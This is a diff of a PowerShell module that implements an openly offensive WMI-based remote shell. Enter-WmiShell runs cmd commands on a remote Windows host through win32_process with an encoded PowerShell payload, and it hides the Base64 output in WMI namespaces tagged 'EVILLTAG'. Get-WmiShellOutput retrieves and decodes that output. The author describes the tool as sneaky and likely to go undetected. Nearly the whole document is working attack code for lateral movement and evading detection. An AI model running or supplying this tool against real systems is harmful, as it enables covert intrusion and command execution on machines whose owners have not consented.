@@ -1,25 +1,161 @@
+function Enter-WmiShell{
+<#
+.SYNOPSIS
+
+Creates a limited* interactive prompt to interact with windows machines in a sneaky way, that is likely to go unnoticed/undetected. Use
+the command "exit" to close and cleanup the session; not doing so will leave data in the WMI namespaces.
+
+Author: Jesse Davis (@secabstraction)
+License: BSD 3-Clause
+Required Dependencies: Out-EncodedCommand, Get-WmiShellOutput
+Optional Dependencies: None
+ 
+.DESCRIPTION
+
+Enter-WmiShell accepts cmd-type commands to be executed on remote hosts via WMI. The output of those commands is captured, Base64 encoded,
+and written to Namespaces in the WMI database.
+ 
+.PARAMETER ComputerName 
+
+Specifies the remote host to interact with.
+
+.PARAMETER UserName
+
+Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
+isn't used, the credentials of the current session will be used.
+
+.EXAMPLE
+
+PS C:\> Enter-WmiShell -ComputerName Server01 -UserName Administrator
+
+[Server01]: WmiShell>whoami
+Server01\Administrator
+
+.NOTES
+
+This cmdlet was inspired by the work of Andrei Dumitrescu's python/vbScript implementation. However, this PowerShell implementation doesn't 
+write any files (vbScript) to disk.
+
+TODO
+----
+
+Add upload/download functionality
+
+.LINK
+
+http://www.secabstraction.com/
+
+#>
+    Param (	
+        [Parameter(Mandatory = $True,
+				   ValueFromPipeline = $True,
+				   ValueFromPipelineByPropertyName = $True)]
+		[string[]]$ComputerName,
+		
+        [Parameter()]
+        [ValidateNotNull()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
+	) # End Param
+     
+        # Start WmiShell prompt
+        $command = ""
+        do{ 
+            # Make a pretty prompt for the user to provide commands at
+            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green 
+            $command = Read-Host
+
+            # Execute commands on remote host 
+            switch ($command) {
+               "exit" { 
+                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
+                    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+                }
+                default { 
+                    $remoteScript = @"
+                    Get-WmiObject -Namespace root\default -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+                    `$wshell = New-Object -c WScript.Shell
+                    function Insert-Piece(`$i, `$piece) {
+                            `$count = `$i.ToString()
+	                        `$zeros = "0" * (6 - `$count.Length)
+	                        `$tag = "EVILLTAG" + `$zeros + `$count
+	                        `$piece = `$tag + `$piece 
+	                        `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
+                        }
+	                    `$cmdExec = `$wshell.Exec("%comspec% /c " + "$command") 
+	                    `$cmdOut = `$cmdExec.StdOut.ReadAll()
+                        `$outEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$cmdOut))
+                        `$outEnc = `$outEnc -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
+                        `$nop = [Math]::Floor(`$outEnc.Length / 5500)
+                        if (`$outEnc.Length -gt 5500) {
+                            `$lastp = `$outEnc.Substring(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
+                            `$outEnc = `$outEnc.Remove(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
+                            for(`$i = 1; `$i -le `$nop; `$i++) { 
+	                            `$piece = `$outEnc.Substring(0,5500)
+		                        `$outEnc = `$outEnc.Substring(5500,(`$outEnc.Length - 5500))
+		                        Insert-Piece `$i `$piece
+                                #Start-Sleep -m 50
+                            }
+                            `$outEnc = `$lastp
+                        }
+	                    Insert-Piece (`$nop + 1) `$outEnc 
+	                    `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
+"@
+                    $scriptBlock = [scriptblock]::Create($remoteScript)
+                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
+                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
+                    
+                    # Wait for script to finish writing output to WMI namespaces
+                    $outputReady = ""
+                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
+                                      -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
+                    until($outputReady)
+                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
+                            -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+                    
+                    # Retrieve cmd output written to WMI namespaces 
+                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
+                }
+            }
+        }until($command -eq "exit")
+}
 function Get-WmiShellOutput{
 <#
 .SYNOPSIS
-Retrieve output stored in WMI namspaces and decode it.
+
+Retrieves Base64 encoded data stored in WMI namspaces and decodes it.
+
+Author: Jesse Davis (@secabstraction)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+ 
 .DESCRIPTION
-Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded output, decode the retrieved data and write it to stdout.
+
+Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded data, decode the retrieved data and write it to StdOut.
  
 .PARAMETER ComputerName 
-.PARAMETER Credential
-.PARAMETER UploadTo 
-.PARAMETER Encoding 
-.EXAMPLE
-PS C:\> New-WmiShell -Credential Administrator
-.NOTES
-Version: 1.0
-Author : Jesse "RBOT" Davis
-.INPUTS
-.OUTPUTS
-.LINK
-#>
 
-[CmdLetBinding()]
+Specifies the remote host to retrieve data from.
+
+.PARAMETER UserName
+
+Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
+isn't used, the credentials of the current session will be used.
+
+.EXAMPLE
+
+PS C:\> Get-WmiShellOutput -ComputerName Server01 -UserName Administrator
+
+.NOTES
+
+This cmdlet was inspired by the work of Andrei Dumitrescu's python implementation.
+
+.LINK
+
+http://www.secabstraction.com/
+
+#>
 
 	Param (
 		[Parameter(Mandatory = $True,
@@ -30,27 +166,22 @@ Author : Jesse "RBOT" Davis
 				   ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNull()]
         [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
-        [Parameter(Mandatory = $True,
-				   ValueFromPipeline = $True,
-				   ValueFromPipelineByPropertyName = $True)]
-        [ValidateSet("Base64", "Hex")]
-		[string]$Encoding
+        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
 	) #End Param
 	
-	$getOutput = @() # 
+	$getOutput = @() 
 	$getOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                     -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | % {$_.Name} | Sort-Object
 	
 	if ([BOOL]$getOutput.Length) {
 		
 	    $reconstructed = ""
+
         #Decode Base64 output
 		foreach ($line in $getOutput) {
 			$cleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
 			$reconstructed += $cleanString
         }
-	
         # Decode base64 padded string and remove front side spaces
 	    Try { $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed)) }
         Catch [System.Management.Automation.MethodInvocationException] {
@@ -59,8 +190,8 @@ Author : Jesse "RBOT" Davis
 		        $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed + "==")) }
 	        Finally {}
 	    }
-        Finally {}
-        Write-Host $decodeString
+        Finally { Write-Host $decodeString }
+        
     }
 	
 
@@ -260,79 +391,4 @@ http://www.exploit-monday.com
     }
 
     Write-Output $CommandLineOutput
-}
-function Enter-WmiShell{
-
-    Param (	
-        [Parameter(Mandatory = $True,
-				   ValueFromPipeline = $True,
-				   ValueFromPipelineByPropertyName = $True)]
-		[string[]]$ComputerName,
-		
-        [Parameter()]
-        [ValidateNotNull()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
-	) # End Param
-     
-        # Start WmiShell prompt
-        $command = ""
-        do{ 
-            # Make a pretty prompt for the user to provide commands at
-            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green 
-            $command = Read-Host
-
-            # Execute commands on remote host 
-            switch ($command) {
-               "exit" { 
-                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
-                    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-                }
-                default { 
-                    $remoteScript = @"
-                    Get-WmiObject -Namespace root\default -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-                    `$wshell = New-Object -c WScript.Shell
-                    function Insert-Piece(`$i, `$piece) {
-                            `$count = `$i.ToString()
-	                        `$zeros = "0" * (6 - `$count.Length)
-	                        `$tag = "EVILLTAG" + `$zeros + `$count
-	                        `$piece = `$tag + `$piece 
-	                        `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
-                        }
-	                    `$cmdExec = `$wshell.Exec("%comspec% /c " + "$command") 
-	                    `$cmdOut = `$cmdExec.StdOut.ReadAll()
-                        `$outEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$cmdOut))
-                        `$outEnc = `$outEnc -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
-                        `$nop = [Math]::Floor(`$outEnc.Length / 5500)
-                        if (`$outEnc.Length -gt 5500) {
-                            `$lastp = `$outEnc.Substring(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
-                            `$outEnc = `$outEnc.Remove(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
-                            for(`$i = 1; `$i -le `$nop; `$i++) { 
-	                            `$piece = `$outEnc.Substring(0,5500)
-		                        `$outEnc = `$outEnc.Substring(5500,(`$outEnc.Length - 5500))
-		                        Insert-Piece `$i `$piece
-                                #Start-Sleep -m 50
-                            }
-                            `$outEnc = `$lastp
-                        }
-	                    Insert-Piece (`$nop + 1) `$outEnc 
-	                    `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
-"@
-                    $scriptBlock = [scriptblock]::Create($remoteScript)
-                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
-                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
-                    
-                    # Wait for script to finish writing output to WMI namespaces
-                    $outputReady = ""
-                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
-                                      -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
-                    until($outputReady)
-                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default `
-                            -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-                    
-                    # Retrieve cmd output written to WMI namespaces 
-                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding Base64
-                }
-            }
-        }until($command -eq "exit")
 }
